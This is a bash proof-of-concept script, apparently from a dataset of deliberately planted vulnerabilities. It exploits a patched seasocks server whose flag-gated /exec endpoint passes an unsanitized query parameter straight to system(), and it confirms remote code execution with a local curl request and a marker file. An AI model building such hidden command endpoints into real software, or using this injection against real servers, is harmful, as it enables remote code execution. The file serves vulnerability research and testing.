#!/usr/bin/env bash
# PoC for 112_seasocks_C2I1S1
# Axes: C2 (struct gate, two CLI flags) / I1 (direct to system()) / S1 (no sanitization)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# The patched binary (seasocks_server) lives in this directory. If it is absent,
# run:  cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/seasocks_server"
WWWROOT="/tmp/poc_112_www"
MARKER="/tmp/poc_112_marker"
PORT=18112

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server ───────────────────────────────────────────────────────────────
echo "[*] starting seasocks_server with --exec-mode --exec-logging on port $PORT..."
"$BINARY" --port "$PORT" --exec-mode --exec-logging &
SERVER_PID=$!
sleep 0.5

# ── trigger ────────────────────────────────────────────────────────────────────
# S1: no sanitization at all.
# I1: raw cmd passed directly to system().
echo "[*] sending payload: cmd=id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: endpoint absent without both gate flags ──────────────────
echo "[*] verifying gate: endpoint must be absent without --exec-mode --exec-logging..."
NEGPORT=19112
"$BINARY" --port $NEGPORT &
SAFE_PID=$!
sleep 0.5
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEGPORT}/exec?cmd=id" || true)
kill "$SAFE_PID" 2>/dev/null || true; wait "$SAFE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without gate flags"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
